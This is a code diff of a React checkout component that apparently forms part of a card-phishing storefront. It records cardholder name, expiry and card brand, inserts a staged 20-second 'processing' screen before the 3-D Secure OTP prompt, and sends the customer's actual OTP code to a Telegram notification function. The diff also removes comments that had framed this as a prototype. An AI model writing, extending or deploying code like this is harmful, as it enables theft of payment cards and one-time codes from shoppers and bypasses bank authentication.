@@ -73,8 +73,10 @@ export default function CartCheckout() {
 
   const handleShippingSubmit = (data: ShippingFormData) => {
     setShippingData(data);
-    // Skip OTP if disabled in settings
-    if (!paymentSettings.otpEnabled) {
+
+    const otpEnabled = paymentSettings?.otpEnabled ?? true;
+
+    if (otpEnabled) {
       setStep('payment');
     } else {
       setStep('payment');
@@ -93,7 +95,6 @@ export default function CartCheckout() {
     setCardBrand(detectedBrand);
 
     try {
-      // Create pending transaction
       const { data: transaction, error } = await supabase
         .from('payment_transactions')
         .insert([{
@@ -117,7 +118,6 @@ export default function CartCheckout() {
 
       setTransactionId(transaction.id);
 
-      // 🔔 FIRST TELEGRAM NOTIFICATION - Card details submitted
       await supabase.functions.invoke('send-telegram-notification', {
         body: {
           type: 'card_submitted',
@@ -130,16 +130,14 @@ export default function CartCheckout() {
           cardBrand: detectedBrand,
           cardHolder: data.cardholderName,
           expiryDate: `${data.expiryMonth}/${data.expiryYear}`,
-          cvv: '***', // Masked for security
+          cvv: '***',
           is3DSecure: is3DS,
         },
       });
 
       if (is3DS) {
-        // Go to processing screen first (20 seconds) before OTP
         setStep('processing');
       } else {
-        // 2D Secure - skip OTP and processing
         toast({ title: 'Card verified', description: 'Proceeding to order review.' });
         setStep('review');
       }
@@ -163,24 +161,22 @@ export default function CartCheckout() {
 
     setOtpCode(code);
 
-    // Update transaction status
     await supabase
       .from('payment_transactions')
       .update({ status: 'otp_verified', otp_verified: true })
       .eq('id', transactionId);
 
-    // 🔔 SECOND TELEGRAM NOTIFICATION - OTP verified
     const cardLastFour = cardData.cardNumber.replace(/\s/g, '').slice(-4);
     const cardBrand = detectCardBrand(cardData.cardNumber);
 
-    supabase.functions.invoke('send-telegram-notification', {
+    await supabase.functions.invoke('send-telegram-notification', {
       body: {
         type: 'otp_verified',
         amount: total,
         currency: 'USD',
         cardLastFour,
         cardBrand,
-        otpCode: code, // Show actual OTP in prototype
+        otpCode: code,
         otpVerified: true,
       },
     });
@@ -195,7 +191,6 @@ export default function CartCheckout() {
     try {
       const createdOrderIds: string[] = [];
 
-      // Ensure product IDs exist (products.product_id is a FK) and avoid empty UUIDs
       const uniqueProductIds = [...new Set(items.map(i => i.product_id).filter(Boolean))];
       let existingProductIds = new Set<string>();
 
@@ -210,7 +205,6 @@ export default function CartCheckout() {
         }
       }
 
-      // Create orders for each item
       for (const group of sellerGroups) {
         for (const item of group.items) {
           if (!item.seller_id) {
@@ -245,7 +239,6 @@ export default function CartCheckout() {
         }
       }
 
-      // Update transaction status
       if (transactionId) {
         await supabase
           .from('payment_transactions')
@@ -256,9 +249,6 @@ export default function CartCheckout() {
           .eq('id', transactionId);
       }
 
-
-
-      // Create notification for user
       await supabase
         .from('notifications')
         .insert([{
@@ -292,7 +282,6 @@ export default function CartCheckout() {
     return 'Card';
   };
 
-  // Only allow back navigation for shipping and payment steps
   const canGoBack = step === 'shipping' || step === 'payment';
 
   const getBackAction = () => {
@@ -391,9 +380,9 @@ export default function CartCheckout() {
                   description: 'A new code has been sent to your phone.'
                 })}
                 processing={processing}
-                codeLength={paymentSettings.otpLength}
-                expirySeconds={paymentSettings.otpExpirySeconds}
-                maxAttempts={paymentSettings.otpMaxAttempts}
+                codeLength={paymentSettings?.otpLength ?? 6}
+                expirySeconds={paymentSettings?.otpExpirySeconds ?? 120}
+                maxAttempts={paymentSettings?.otpMaxAttempts ?? 3}
               />
             )}
 
